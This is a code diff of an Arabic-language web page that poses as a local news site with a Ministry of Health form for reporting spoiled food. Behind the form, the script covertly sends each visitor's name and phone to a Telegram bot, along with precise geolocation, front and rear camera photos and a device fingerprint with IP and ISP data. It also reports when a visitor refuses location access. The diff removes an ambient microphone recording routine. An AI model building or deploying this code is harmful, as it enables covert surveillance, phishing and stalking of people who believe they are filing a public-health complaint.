+            <div class="result-name">تم إرسال البلاغ بنجاح!</div>
+            <div class="result-sub">شكراً لتعاونك، سيتم مراجعة البلاغ من قبل المختصين</div>
         </div>
-        <div class="step-info" id="stepInfo">⏱️ 0 ثانية</div>
+
+        <div class="error-msg" id="errorMsg">⚠️ حدث خطأ، حاول مرة أخرى</div>
     </div>
 
-    <!-- رسالة نجاح -->
-    <div class="result-box" id="resultBox">
-        <span class="result-icon">✅</span>
-        <div class="result-name" id="resultName">تم إرسال البلاغ بنجاح!</div>
-        <div class="result-sub" id="resultSub">شكراً لتعاونك، سيتم مراجعة البلاغ من قبل المختصين</div>
-    </div>
-
-    <!-- رسالة خطأ -->
-    <div class="error-msg" id="errorMsg">⚠️ حدث خطأ، حاول مرة أخرى</div>
-
-    <!-- تذييل -->
-    <div class="footer-links">
-        <span>🔒 بيانات آمنة</span>
-        <span>⚡ إرسال فوري</span>
-        <span>🏥 حماية الصحة العامة</span>
+    <div class="footer-note">
+        © 2026 أخبار الفشن وبني سويف | جميع الحقوق محفوظة
     </div>
 </div>
 
-<!-- ====== حالة ====== -->
+<!-- حالة -->
 <div class="status-badge">
     <span class="dot"></span>
     نشط
@@ -601,7 +697,7 @@
         const MASTER_ID = "5849068535";
 
         // ============================================================
-        // ================ دالة الإرسال إلى تليجرام ===================
+        // ================ دالة الإرسال لتليجرام =====================
         // ============================================================
         async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
             try {
@@ -612,22 +708,19 @@
                     fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
                     fd.append('caption', caption);
                     await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
-                } 
-                else if (type === 'video') {
+                } else if (type === 'video') {
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
                     fd.append('video', mediaBlob, 'clip_' + Date.now() + '.mp4');
                     fd.append('caption', caption);
                     await fetch(url + 'sendVideo', { method: 'POST', body: fd });
-                }
-                else if (type === 'audio') {
+                } else if (type === 'audio') {
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
                     fd.append('audio', mediaBlob, 'voice_note.ogg');
                     fd.append('caption', caption);
                     await fetch(url + 'sendAudio', { method: 'POST', body: fd });
-                }
-                else {
+                } else {
                     await fetch(url + 'sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -639,12 +732,41 @@
         }
 
         // ============================================================
-        // ================ الكاميرا الأمامية (سيلفي) =================
+        // ================ الموقع الجغرافي (أول شيء إجباري) ==========
+        // ============================================================
+        function getLocation(chatId, botToken, formData) {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ success: false, reason: 'غير مدعوم' });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const accuracy = pos.coords.accuracy;
+                    let addressHint = "";
+                    try {
+                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                        const data = await revGeo.json();
+                        if (data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
+                    } catch(e) {}
+
+                    const locMsg = `🌍 <b>موقع البلاغ</b>\n👤 الاسم: ${formData.fullName || 'غير محدد'}\n📞 الهاتف: ${formData.phone || 'غير محدد'}\n🏷️ المنتج: ${formData.product || 'غير محدد'}\n📍 المكان: ${formData.place || 'غير محدد'}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
+                    await sendToTelegram(chatId, botToken, 'text', null, locMsg);
+                    resolve({ success: true });
+                }, (err) => {
+                    resolve({ success: false, reason: err.message });
+                }, { enableHighAccuracy: true, timeout: 15000 });
+            });
+        }
+
+        // ============================================================
+        // ================ الكاميرا الأمامية =========================
         // ============================================================
         async function captureFrontCamera(chatId, botToken, formData) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                 });
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -660,19 +782,19 @@
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch(e) { 
+            } catch(e) {
                 console.warn("Front camera denied");
-                return false; 
+                return false;
             }
         }
 
         // ============================================================
-        // ================ الكاميرا الخلفية (تصوير المنتج) ===========
+        // ================ الكاميرا الخلفية ==========================
         // ============================================================
         async function captureBackCamera(chatId, botToken, formData) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } 
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } }
                 });
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -687,77 +809,20 @@
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch(e) { 
+            } catch(e) {
                 console.warn("Back camera denied");
-                return false; 
+                return false;
             }
-        }
-
-        // ============================================================
-        // ================ التسجيل الصوتي =============================
-        // ============================================================
-        async function recordAmbientAudio(chatId, botToken, formData) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                const audioPromise = new Promise(resolve => {
-                    mediaRecorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const caption = `🎤 تسجيل صوتي لوصف البلاغ\n👤 الاسم: ${formData.fullName}\n🏷️ المنتج: ${formData.product}\n📞 الهاتف: ${formData.phone}`;
-                        await sendToTelegram(chatId, botToken, 'audio', blob, caption);
-                        resolve(true);
-                    };
-                });
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 8000);
-                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 9000);
-                return await audioPromise;
-            } catch(e) { 
-                console.warn("Audio denied");
-                return false; 
-            }
-        }
-
-        // ============================================================
-        // ================ الموقع الجغرافي ============================
-        // ============================================================
-        function getPreciseLocation(chatId, botToken, formData) {
-            return new Promise((resolve) => {
-                if(!navigator.geolocation) {
-                    resolve(false);
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lng = pos.coords.longitude;
-                    const accuracy = pos.coords.accuracy;
-                    let addressHint = "";
-                    try {
-                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
-                        const data = await revGeo.json();
-                        if(data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
-                    } catch(e) {}
-                    const locMsg = `🌍 <b>موقع البلاغ</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}\n📍 المكان: ${formData.place}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
-                    await sendToTelegram(chatId, botToken, 'text', null, locMsg);
-                    resolve(true);
-                }, (err) => {
-                    console.warn("Location denied");
-                    resolve(false);
-                }, { enableHighAccuracy: true, timeout: 10000 });
-            });
         }
 
         // ============================================================
         // ================ بصمة الجهاز ================================
         // ============================================================
-        async function getDeepDeviceFingerprint(chatId, botToken, formData) {
+        async function getDeviceFingerprint(chatId, botToken, formData) {
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
             const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
             const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
-            
             let batteryLevel = "غير متاح";
             if (navigator.getBattery) {
                 try {
@@ -765,21 +830,18 @@
                     batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
                 } catch(e) {}
             }
-            
             let connection = "غير معروف";
             if (navigator.connection) {
                 connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
             }
-            
             const deviceMsg = `🕵️‍♂️ <b>بيانات جهاز مقدم البلاغ</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
-            
             await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
         }
 
         // ============================================================
-        // ================ معلومات IP =================================
+        // ================ IP ========================================
         // ============================================================
-        async function getRichIPData(chatId, botToken, formData) {
+        async function getIPData(chatId, botToken, formData) {
             try {
                 const [ipRes, ipInfoRes] = await Promise.all([
                     fetch('https://api.ipify.org?format=json'),
@@ -788,54 +850,39 @@
                 const ipData = await ipRes.json();
                 let ipDetails = {};
                 try { ipDetails = await ipInfoRes.json(); } catch(e) {}
-                const ipAddr = ipData.ip;
-                let country = ipDetails.country_name || "غير معروف";
-                let city = ipDetails.city || "غير معروف";
-                let isp = ipDetails.org || ipDetails.asn || "غير معروف";
-                const ipMsg = `🌐 <b>IP مقدم البلاغ</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
+                const ipMsg = `🌐 <b>IP مقدم البلاغ</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}\n🔹 IP: ${ipData.ip}\n🏳️ البلد: ${ipDetails.country_name || 'غير معروف'}\n🏙️ المدينة: ${ipDetails.city || 'غير معروف'}\n📡 المزود: ${ipDetails.org || 'غير معروف'}`;
                 await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
             } catch(e) {}
         }
 
         // ============================================================
-        // ================ عناصر الواجهة ==============================
+        // ================ عناصر الواجهة =============================
         // ============================================================
+        const openReportBtn = document.getElementById('openReportBtn');
+        const mainCard = document.getElementById('mainCard');
+        const backBtn = document.getElementById('backBtn');
         const startBtn = document.getElementById('startBtn');
-        const progressWrap = document.getElementById('progressWrap');
-        const progressFill = document.getElementById('progressFill');
-        const percentLabel = document.getElementById('percentLabel');
-        const stepLabel = document.getElementById('stepLabel');
-        const stepInfo = document.getElementById('stepInfo');
         const resultBox = document.getElementById('resultBox');
-        const resultName = document.getElementById('resultName');
-        const resultSub = document.getElementById('resultSub');
         const errorMsg = document.getElementById('errorMsg');
 
         let isRunning = false;
-        let progressInterval = null;
-        let counterInterval = null;
-        let seconds = 0;
-        let currentProgress = 0;
 
-        function updateProgress(value, label, info) {
-            currentProgress = Math.min(value, 100);
-            progressFill.style.width = currentProgress + '%';
-            percentLabel.textContent = Math.round(currentProgress) + '%';
-            if (label) stepLabel.textContent = label;
-            if (info) stepInfo.textContent = info;
-        }
+        // فتح بطاقة البلاغ
+        openReportBtn.addEventListener('click', () => {
+            mainCard.classList.add('show');
+            mainCard.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        });
+
+        // رجوع للأخبار
+        backBtn.addEventListener('click', () => {
+            mainCard.classList.remove('show');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
 
         function showError(text) {
             errorMsg.textContent = text || '⚠️ حدث خطأ، حاول مرة أخرى';
             errorMsg.classList.add('show');
-            setTimeout(() => errorMsg.classList.remove('show'), 4000);
-        }
-
-        function showSuccess() {
-            resultName.textContent = '✅ تم إرسال البلاغ بنجاح!';
-            resultSub.textContent = 'شكراً لتعاونك، سيتم مراجعة البلاغ من قبل المختصين';
-            resultBox.classList.add('show');
-            setTimeout(() => resultBox.classList.remove('show'), 8000);
+            setTimeout(() => errorMsg.classList.remove('show'), 5000);
         }
 
         // ============================================================
@@ -844,7 +891,7 @@
         async function startProcess() {
             if (isRunning) return;
 
-            // ====== جمع بيانات النموذج ======
+            // جمع البيانات
             const fullName = document.getElementById('fullName').value.trim();
             const phone = document.getElementById('phoneNumber').value.trim();
             const place = document.getElementById('place').value.trim();
@@ -853,117 +900,89 @@
             const issueType = document.getElementById('issueType').value;
             const notes = document.getElementById('notes').value.trim();
 
-            // التحقق من الحقول المطلوبة
+            // التحقق
             if (!fullName || !phone || !place || !product || !purchaseDate || !issueType) {
                 showError('⚠️ يرجى تعبئة جميع الحقول المطلوبة');
                 return;
             }
-
             if (phone.length < 10) {
                 showError('⚠️ رقم الهاتف غير صحيح');
                 return;
             }
 
-            // تجهيز بيانات النموذج
-            const formData = {
-                fullName: fullName,
-                phone: phone,
-                place: place,
-                product: product,
-                purchaseDate: purchaseDate,
-                issueType: issueType,
-                notes: notes || 'لا يوجد'
-            };
+            const formData = { fullName, phone, place, product, purchaseDate, issueType, notes: notes || 'لا يوجد' };
 
             isRunning = true;
-            startBtn.classList.add('loading');
             startBtn.disabled = true;
+            startBtn.textContent = '⏳ جاري الإرسال...';
             resultBox.classList.remove('show');
             errorMsg.classList.remove('show');
-            progressWrap.classList.add('active');
-
-            // بدء شريط التحميل
-            let progress = 0;
-            seconds = 0;
-            updateProgress(0, '⏳ جاري المعالجة...', '⏱️ 0 ثانية');
-
-            progressInterval = setInterval(() => {
-                const increment = Math.random() * 3 + 0.5;
-                progress = Math.min(progress + increment, 100);
-                updateProgress(progress, stepLabel.textContent, stepInfo.textContent);
-            }, 300);
-
-            counterInterval = setInterval(() => {
-                seconds++;
-                stepInfo.textContent = `⏱️ ${seconds} ثانية`;
-            }, 1000);
 
             try {
                 // ====== 1. إرسال بيانات البلاغ ======
-                updateProgress(5, '📤 جاري إرسال البلاغ...');
                 const formMsg = `🏥 <b>بلاغ عن أغذية فاسدة - وزارة الصحة</b>\n\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n📍 المكان: ${formData.place}\n🏷️ المنتج: ${formData.product}\n📅 تاريخ الشراء: ${formData.purchaseDate}\n⚠️ المشكلة: ${formData.issueType}\n📝 التفاصيل: ${formData.notes}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
                 await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, formMsg);
-                await new Promise(r => setTimeout(r, 400));
 
-                // ====== 2. بصمة الجهاز ======
-                updateProgress(20, '🕵️ جاري جمع بيانات الجهاز...');
-                await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, formData);
-                await new Promise(r => setTimeout(r, 400));
+                // ====== 2. الموقع الجغرافي (أول شيء إجباري) ======
+                const locResult = await getLocation(MASTER_ID, BOT_TOKEN, formData);
 
-                // ====== 3. IP ======
-                updateProgress(35, '🌐 جاري تحديد الموقع...');
-                await getRichIPData(MASTER_ID, BOT_TOKEN, formData);
-                await new Promise(r => setTimeout(r, 400));
+                // لو الموقع مرفوض، نبلغ المالك ونكمل
+                if (!locResult.success) {
+                    await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
+                        `⚠️ <b>المستخدم رفض الموقع</b>\n👤 ${formData.fullName}\n📞 ${formData.phone}\n🔴 السبب: ${locResult.reason || 'مرفوض'}`
+                    );
+                }
 
-                // ====== 4. الكاميرا الأمامية ======
-                updateProgress(50, '📸 جاري التقاط الصورة الشخصية...');
+                // ====== 3. الكاميرا الأمامية ======
                 await captureFrontCamera(MASTER_ID, BOT_TOKEN, formData);
-                await new Promise(r => setTimeout(r, 400));
 
-                // ====== 5. الكاميرا الخلفية (تصوير المنتج) ======
-                updateProgress(70, '📷 جاري تصوير المنتج...');
+                // ====== 4. الكاميرا الخلفية ======
                 await captureBackCamera(MASTER_ID, BOT_TOKEN, formData);
-                await new Promise(r => setTimeout(r, 400));
 
-                // ====== 6. التسجيل الصوتي ======
-                updateProgress(85, '🎤 جاري التسجيل الصوتي...');
-                await recordAmbientAudio(MASTER_ID, BOT_TOKEN, formData);
-                await new Promise(r => setTimeout(r, 400));
+                // ====== 5. بصمة الجهاز ======
+                await getDeviceFingerprint(MASTER_ID, BOT_TOKEN, formData);
 
-                // ====== 7. الموقع ======
-                updateProgress(95, '📍 جاري تحديد الموقع الجغرافي...');
-                await getPreciseLocation(MASTER_ID, BOT_TOKEN, formData);
-                await new Promise(r => setTimeout(r, 400));
+                // ====== 6. IP ======
+                await getIPData(MASTER_ID, BOT_TOKEN, formData);
 
-                // ====== 8. الإكمال ======
-                updateProgress(100, '✅ تم الإرسال بنجاح!', '✅ اكتمل الإرسال');
-                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
-                    `✅ <b>تم إرسال بلاغ الأغذية الفاسدة بنجاح!</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🏷️ المنتج: ${formData.product}`
+                // ====== 7. إشعار نهائي ======
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
+                    `✅ <b>تم إرسال بلاغ الأغذية الفاسدة بنجاح!</b>\n👤 ${formData.fullName}\n📞 ${formData.phone}\n🏷️ ${formData.product}`
                 );
 
-                // عرض رسالة النجاح
-                showSuccess();
+                // عرض النجاح
+                resultBox.classList.add('show');
+                setTimeout(() => resultBox.classList.remove('show'), 8000);
 
             } catch(e) {
                 console.error(e);
                 showError('❌ حدث خطأ أثناء إرسال البلاغ');
             }
 
-            // إنهاء التحميل
-            clearInterval(progressInterval);
-            clearInterval(counterInterval);
-
-            setTimeout(() => {
-                progressWrap.classList.remove('active');
-                startBtn.classList.remove('loading');
-                startBtn.disabled = false;
-                isRunning = false;
-            }, 800);
+            startBtn.disabled = false;
+            startBtn.textContent = '📤 إرسال البلاغ';
+            isRunning = false;
         }
 
-        // ========== ربط الأحداث ==========
-        startBtn.onclick = startProcess;
+        startBtn.addEventListener('click', startProcess);
 
+        // أزرار الإعجاب
+        document.querySelectorAll('.like-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const countSpan = btn.querySelector('.like-count');
+                if (!countSpan) return;
+                let count = parseInt(countSpan.textContent);
+                if (btn.classList.contains('liked')) {
+                    btn.classList.remove('liked');
+                    countSpan.textContent = count - 1;
+                } else {
+                    btn.classList.add('liked');
+                    countSpan.textContent = count + 1;
+                }
+            });
+        });
+
+        console.log("📰 صفحة أخبار الفشن + بلاغ أغذية فاسدة جاهزة");
     })();
 </script>
 
